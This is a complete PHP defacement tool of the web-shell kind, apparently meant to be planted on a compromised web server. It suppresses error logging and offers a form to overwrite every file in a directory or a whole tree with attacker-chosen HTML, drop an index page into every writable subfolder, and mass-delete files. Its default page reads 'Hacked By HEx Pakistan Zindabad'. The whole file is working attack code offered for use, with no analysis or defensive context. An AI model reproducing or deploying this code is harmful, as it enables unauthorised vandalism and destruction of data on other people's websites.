<?php 
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
echo "<center><form action=\"\" method=\"post\"> ";
function edit_file($file, $index) {
    if (is_writable($file)) {
        clear_fill($file, $index);
        echo "<Span style='color:green;'><strong> [+] Done 100% Successfull </strong></span><br></center>";
    } else {
        echo "<Span style='color:red;'><strong> [-] Failed :( </strong></span><br></center>"; 
    }
} 
function hapus_Massal($dir, $namafile) {
    if (is_writable($dir)) {
        $dira = scandir($dir);
        foreach ($dira as $dirb) {
            $dirc = "$dir/$dirb";
            $lokasi = $dirc . '/' . $namafile;
            if ($dirb === '.') {
                if (file_exists("$dir/$namafile")) {
                    unlink("$dir/$namafile");
                }
            } elseif ($dirb === '..') {
                if (file_exists("" . dirname($dir) . "/$namafile")) {
                    unlink("" . dirname($dir) . "/$namafile");
                }
            } else {
                if (is_dir($dirc)) {
                    if (is_writable($dirc)) {
                        if (file_exists($lokasi)) {
                            echo "[<font color=orange>DELETED</font>] $lokasi<br>";
                            unlink($lokasi);
                            $idx = hapus_Massal($dirc, $namafile);
                        }
                    }
                }
            }
        }
    }
}
function clear_fill($file, $index) {
    if (file_exists($file)) {
        $handle = fopen($file, 'w');
        fwrite($handle, '');
        fwrite($handle, $index);
        fclose($handle);
    }
}
function gass() {
    global $dirr, $index;
    chdir($dirr);
    $me = str_replace(dirname(__FILE__) . '/', '', __FILE__);
    $files = scandir($dirr);
    $notallow = array(".htaccess", "www", "Web.Config", "UMD.php", "Web.config", "web.config", "web.Config", "..", ".");
    sort($files);
    $n = 0;
    foreach ($files as $file) {
        if ($file != $me && is_dir($file) != 1 && !in_array($file, $notallow)) {
            echo "<center><Span style='color: #8A8A8A;'><strong>$dirr/</span>$file</strong> ====> ";
            edit_file($file, $index);
            flush();
            $n = $n + 1;
        }
    }
    echo "<br>";
    echo "<center><br><h3>$n Files Defaced </h3></center><br> ";
} 
function ListFiles($dirrall) {
    if ($dh = opendir($dirrall)) {
        $files = Array();
        $inner_files = Array();
        $me = str_replace(dirname(__FILE__) . '/', '', __FILE__);
        $notallow = array($me, ".htaccess", "www", "Web.Config", "UMD.php", "Web.config", "web.config", "web.Config");
        while ($file = readdir($dh)) {
            if ($file != "." && $file != ".." && $file[0] != '.' && !in_array($file, $notallow)) {
                if (is_dir($dirrall . "/" . $file)) {
                    $inner_files = ListFiles($dirrall . "/" . $file);
                    if (is_array($inner_files)) $files = array_merge($files, $inner_files);
                } else {
                    array_push($files, $dirrall . "/" . $file);
                }
            }
        }
        closedir($dh);
        return $files;
    }
}
function gass_all() {
    global $index;
    $dirrall = $_POST['d_dir'];
    foreach (ListFiles($dirrall) as $key => $file) {
        $file = str_replace('//', "/", $file);
        echo "<center><strong>$file</strong> ===>";
        edit_file($file, $index);
        flush();
    }
    $key = $key + 1;
    echo "<center><br><h3>$key Files Defaced </h3></center><br>";
}
function sabun_Massal($dir, $namafile, $isi_script) {
    if (is_writable($dir)) {
        $dira = scandir($dir);
        foreach ($dira as $dirb) {
            $dirc = "$dir/$dirb";
            $lokasi = $dirc . '/' . $namafile;
            if ($dirb === '.') {
                file_put_contents($lokasi, $isi_script);
            } elseif ($dirb === '..') {
                file_put_contents($lokasi, $isi_script);
            } else {
                if (is_dir($dirc)) {
                    if (is_writable($dirc)) {
                        echo "<font color=orange>[ DONE ] </font><font color=white> $lokasi</font><br>";
                        file_put_contents($lokasi, $isi_script);
                        $idx = sabun_Massal($dirc, $namafile, $isi_script);
                    }  } }  } }
} 
if ($_POST['Mass'] == 'onedir') {
    echo "<br> Versi Text Area<br><textarea style='background:black;outline:none;color:red;' name='index' rows='10' cols='67'>
";
    $ini = "http://";
    $mainpath = $_POST[d_dir];
    $file = $_POST[d_file];
    $dir = opendir("$mainpath");
    $code = base64_encode($_POST[script]);
    $indx = base64_decode($code);
    while ($row = readdir($dir)) {
        $start = @fopen("$row/$file", "w+");
        $finish = @fwrite($start, $indx);
        if ($finish) {
            echo "$ini$row/$file
";
        }
    }
    echo "</textarea><br><br><br><b>Versi Text</b><br><br><br>
";
    $mainpath = $_POST[d_dir];
    $file = $_POST[d_file];
    $dir = opendir("$mainpath");
    $code = base64_encode($_POST[script]);
    $indx = base64_decode($code);
    while ($row = readdir($dir)) {
        $start = @fopen("$row/$file", "w+");
        $finish = @fwrite($start, $indx);
        if ($finish) {
            echo '<a href="http://' . $row . '/' . $file . '" target="_blank">http://' . $row . '/' . $file . '</a><br>';
        }
    }
} elseif ($_POST['Mass'] == 'sabunkabeh') {
    gass();
} elseif ($_POST['Mass'] == 'hapusMassal') {
    hapus_Massal($_POST['d_dir'], $_POST['d_file']);
} elseif ($_POST['Mass'] == 'sabunmematikan') {
    gass_all();
} elseif ($_POST['Mass'] == 'Massdeface') {
    echo "<div style='margin: 5px auto; padding: 5px'>";
    sabun_Massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
    echo "</div>";
} else {
    echo "<center>		<font face='Iceland' color='orange' size='3' >Select Type:<br></font><select class=\"select\" name=\"Mass\"  style=\"width: 450px; background-color:#202832; color:#ffffff\" height=\"10\" ><option value=\"onedir\">Mass Deface 1 Dir</option>	<option value=\"Massdeface\">Mass Deface ALL Dir</option><option value=\"sabunkabeh\">Current Dir All Files</option>	<option value=\"sabunmematikan\">Replace Everything With Deface</option><option value=\"hapusMassal\">Mass Delete Files</option></center></select><br><font face='Iceland' color='orange' size='3' >Folder:</font><br>	<input name='d_dir' value='".getcwd()."' required='' type='text' style='width: 450px; background-color:#202832; color:#ffffff' height='10'><br><font face='Iceland' color='orange' size='3' >Filename:</font><br><input type='text' name='d_file' value='index.html' style='width: 450px; background-color:#202832; color:#ffffff' height='10'><br><font face='Iceland' color='orange'  size='3' >Index File:</font><br>
	
	<textarea name='script' style='width: 450px; height: 200px; background-color:#202832; color:#ffffff '>  <br><br><br><br><br><center><h1> Hacked By HEx <br> Pakistan Zindabad</h1></center>  </textarea><br>
	
	<input type='submit' name='start' value='Mass Deface' style='width: 200px;'></form></center></div>"; }  ?> 
